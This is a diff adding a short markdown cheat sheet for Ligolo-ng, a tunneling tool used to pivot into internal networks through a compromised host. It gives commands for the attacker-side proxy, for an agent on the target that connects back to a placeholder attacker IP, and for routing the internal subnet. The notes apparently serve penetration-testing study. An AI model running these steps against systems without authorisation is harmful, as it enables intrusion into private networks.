@@ -1,0 +1,45 @@
+# Ligolo-ng
+
+TUN-based tunneling tool: routes traffic through a compromised host at the kernel level, so tools work natively without proxychains.
+
+## Setup
+
+Create the TUN interface on your attack box once, then start the proxy listener.
+
+```bash
+# Create TUN interface
+sudo ip tuntap add user kanyo mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy
+sudo proxy -selfcert -laddr 0.0.0.0:11601
+```
+
+## On Target
+
+Drop the agent on the compromised host and connect back to your proxy.
+
+```bash
+# Linux
+./agent -connect <attacker_IP>:11601 -ignore-cert
+
+# Windows
+agent.exe -connect <attacker_IP>:11601 -ignore-cert
+```
+
+## In Ligolo Shell
+
+Select the session and start the tunnel: traffic will flow through the TUN interface.
+
+```
+session
+start
+```
+
+## Add Route
+
+Add a route for the internal subnet through the ligolo interface so your tools can reach it directly.
+
+```bash
+sudo ip route add <internal_subnet>/24 dev ligolo
+```
